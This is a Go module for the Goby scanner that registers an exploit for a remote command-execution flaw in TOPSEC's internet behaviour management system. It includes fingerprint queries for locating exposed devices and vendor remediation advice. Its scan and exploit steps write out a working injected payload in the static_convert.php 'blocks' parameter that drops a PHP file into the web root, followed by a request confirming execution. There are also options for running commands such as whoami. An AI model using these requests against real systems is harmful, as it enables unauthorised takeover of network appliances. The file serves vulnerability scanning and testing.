package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TOPSEC-Employee-Internet-Management static_convert_php RCE",
    "Description": "In a file, the user's input is not filtered, resulting in arbitrary file writing operation",
    "Impact": "TOPSEC-Employee-Internet-Management static_convert_php RCE",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://www.topsec.com.cn/product/27.html\">https://www.topsec. com.cn/product/27.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls. 2. If it is not necessary, it is forbidden to access the system from the public network. </p>",
    "Product": "TOPSEC-IBMS",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "天融信上网行为管理系统 static_convert 文件 命令执行漏洞",
            "Description": "<p>天融信上网行为管理系统是一个为客户提供安全策略、链路负载、身份认证、流量管理、行为管控、上网审计、日志追溯、网监对接、用户行为分析、VPN的系统。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.topsec.com.cn/product/27.html\">https://www.topsec.com.cn/product/27.html</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "天融信-上网行为管理系统",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "TOPSEC-Employee-Internet-Management static_convert_php RCE",
            "Description": "In a file, the user's input is not filtered, resulting in arbitrary file writing operation",
            "Impact": "TOPSEC-Employee-Internet-Management static_convert_php RCE",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://www.topsec.com.cn/product/27.html\">https://www.topsec. com.cn/product/27.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls. <br>2. If it is not necessary, it is forbidden to access the system from the public network. </p>",
            "Product": "TOPSEC-IBMS",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "((header=\"Server: TOPSEC\" && header!=\"couchdb\" && body!=\"content=\\\"JnSec Web UI\\\"\") || cert=\"Topsec Network Security Technology\" || header=\"Server: topsecos\" || banner=\"Server: topsecos\" || banner=\"Beijing Topsec Network Security Technology Co.,Ltd\") || (body=\"ActiveXObject\" && body=\"name=\\\"dkey_login\\\" \" && body=\"repeat-x left top\") || ((header=\"Server: TOPSEC\" && header!=\"couchdb\" && body!=\"content=\\\"JnSec Web UI\\\"\") || cert=\"Topsec Network Security Technology\" || header=\"Server: topsecos\" || banner=\"Server: topsecos\" || banner=\"Beijing Topsec Network Security Technology Co.,Ltd\") || (body=\"天融信入侵防御系统TopIDP\")",
    "GobyQuery": "((header=\"Server: TOPSEC\" && header!=\"couchdb\" && body!=\"content=\\\"JnSec Web UI\\\"\") || cert=\"Topsec Network Security Technology\" || header=\"Server: topsecos\" || banner=\"Server: topsecos\" || banner=\"Beijing Topsec Network Security Technology Co.,Ltd\") || (body=\"ActiveXObject\" && body=\"name=\\\"dkey_login\\\" \" && body=\"repeat-x left top\") || ((header=\"Server: TOPSEC\" && header!=\"couchdb\" && body!=\"content=\\\"JnSec Web UI\\\"\") || cert=\"Topsec Network Security Technology\" || header=\"Server: topsecos\" || banner=\"Server: topsecos\" || banner=\"Beijing Topsec Network Security Technology Co.,Ltd\") || (body=\"天融信入侵防御系统TopIDP\")",
    "Author": "NaMi",
    "Homepage": "https://www.topsec.com.cn/product/27.html",
    "DisclosureDate": "2021-07-07",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20%27%3C?php%20echo%20md5(2333);@unlink(__FILE__);?%3E%27%20%3E%3E%20/var/www/html/shell.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ip -6 neigh del",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/shell.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "f7e0b956540676a129760a3eae309294",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20%27%3C?php%20echo%20md5(2333);@unlink(__FILE__);?%3E%27%20%3E%3E%20/var/www/html/shell.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ip -6 neigh del",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/shell.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "f7e0b956540676a129760a3eae309294",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "createSelect",
            "value": "whoami,ifconfig,ls",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Topsec-Intrusion-prevention-system-TopIDP",
            "TOPSEC-Product"
        ]
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
